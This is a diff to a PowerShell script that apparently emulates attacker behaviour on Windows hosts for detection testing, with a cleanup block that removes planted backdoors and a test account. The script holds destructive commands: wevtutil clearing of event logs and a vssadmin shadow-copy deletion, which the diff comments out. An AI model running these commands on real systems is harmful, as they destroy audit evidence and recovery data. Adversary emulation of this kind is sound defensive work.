@@ -44,15 +44,10 @@ wevtutil cl Security
 wevtutil cl Application
 Write-Output "#-------------------------------------------------------------------------"
 Write-Output "# Shadow copy deletion"
-vssadmin.exe Delete Shadows /All /Quiet
+# vssadmin.exe Delete Shadows /All /Quiet
 Write-Output "#-------------------------------------------------------------------------"
 Write-Output "# Command and Control"
 start AntiUsbShortCut\AntiUsb.exe "AntiUsbShortCut\AntiUsbShortCut.zip"
-Write-Output "#-------------------------------------------------------------------------"
-Write-Output "# Cleanup"
-if ($laptop -eq 1) { del C:\tools.zip C:\soundrecorder.exe C:\output.wav C:\AntiUsbShortCut\AntiUsb.exe }
-else { del C:\tools.zip C:\capture.etl C:\AntiUsbShortCut\AntiUsb.exe }
-rmdir /S /Q C:\AntiUsbShortCut 
 Write-Output "#-------------------------------------------------------------------------"
 Write-Output "# Ping IOC for mapping to adversary group"
 ping adobeincorp.com
@@ -61,3 +56,18 @@ Write-Output "# Start of Lateral Movement - ipconfig and arp"
 ipconfig /all
 arp -a
 Write-Output "#-------------------------------------------------------------------------"
+Write-Output "# Cleanup"
+if ($laptop -eq 1) { 
+	del C:\tools.zip C:\soundrecorder.exe C:\output.wav C:\AntiUsbShortCut\AntiUsb.exe
+	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /f
+	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /f
+	net user /del BadActor666
+	rmdir /S /Q C:\AntiUsbShortCut 
+}
+else { 
+	del C:\tools.zip C:\capture.etl C:\AntiUsbShortCut\AntiUsb.exe 
+	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /f
+	reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /f
+	net user /del BadActor666
+	rmdir /S /Q C:\AntiUsbShortCut 
+}
